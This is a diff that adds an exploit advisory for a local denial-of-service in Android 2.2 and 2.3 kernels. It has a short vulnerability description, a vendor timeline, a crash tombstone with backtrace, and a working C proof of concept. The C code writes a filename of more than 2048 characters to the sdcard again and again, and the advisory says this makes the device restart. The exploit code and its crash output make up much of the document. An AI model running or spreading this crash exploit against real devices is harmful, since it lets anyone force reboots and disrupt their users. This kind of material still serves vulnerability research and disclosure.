@@ -1,0 +1,92 @@
+# Exploit Title: Android Kernel 2.6 Local DoS
+# Date: 12/7/12
+# Author: G13
+# Twitter: @g13net
+# Versions: Android 2.2, 2.3
+# Category: DoS (android)
+#
+
+##### Vulnerability #####
+
+The Android OS is vulnerable to a local DoS when a filename with a
+length of 2048
+or larger is attempted to be written to the sdcard(vfat fs) multiple times.
+
+The result of successful running of the exploit code is the system restarting.
+
+The vulnerability only effects Android kernels that are in the version
+2.6 family.
+
+##### Vendor Timeline #####
+
+The Android Security Team has been contacted with updated PoC code and
+details.
+
+They have been aware of this vulnerability for over a year.
+
+##### Tombstone #####
+
+*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
+Build fingerprint:
+'verizon/SCH-I800/SCH-I800:2.3.4/GINGERBREAD/EF01:user/release-keys'
+pid: 349, tid: 363, name: SensorService  >>> system_server <<<
+signal 8 (SIGFPE), code -6 (?), fault addr 0000015d
+    r0 00000000  r1 00000008  r2 00000040  r3 00000000
+    r4 2a114310  r5 00000000  r6 51504690  r7 00000025
+    r8 2a114330  r9 2a114350  sl 00000003  fp 00000003
+    ip fffd4084  sp 51501eb0  lr 40039b70  pc 40037cf0  cpsr 20030010
+    d0  4271bc7bd0b80000  d1  0000000000000000
+    d2  0000000000000000  d3  427181eae9200000
+    d4  0000000000000000  d5  0000000000000000
+    d6  0000000000000000  d7  0000000000000000
+    d8  0000000000000000  d9  0000000000000000
+    d10 0000000000000000  d11 0000000000000000
+    d12 0000000000000000  d13 0000000000000000
+    d14 0000000000000000  d15 0000000000000000
+    d16 3fe99999a0000000  d17 3fe999999999999a
+    d18 0033003200310030  d19 0000000000000000
+    d20 3fc554e7eb0eb47c  d21 3e66376972bea4d0
+    d22 3f4de16b9c24a98f  d23 3fb0f4a31edab38b
+    d24 3fede16b9c24a98f  d25 3fe55559ee5e69f9
+    d26 0000000000000000  d27 0000000000000000
+    d28 0000000000000005  d29 0000000000000000
+    d30 0000000000000000  d31 0000000000000000
+    scr 20000010
+
+backtrace:
+    #00  pc 0000dcf0  /system/lib/libc.so (kill+12)
+    #01  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #02  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #03  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #04  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #05  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #06  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #07  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #08  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #09  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #10  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #11  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #12  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #13  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #14  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #15  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+    #16  pc 0000fb6c  /system/lib/libc.so (__aeabi_idiv0+8)
+
+##### PoC #####
+
+#include <stdio.h>
+
+int main(int argc, char** argv) {
+  char buf[5000];
+  int j,k;
+  FILE *fp;
+  /* Path to sdcard, typically /sdcard/ */
+  strcpy(buf,"/sdcard/");
+  for(k=0;k<=2048;k++){
+    strcat(buf,"A");
+  };
+  for(j=0;j<=50;j++){
+    fp=fopen(buf,"w");
+  };
+return 0;
+}
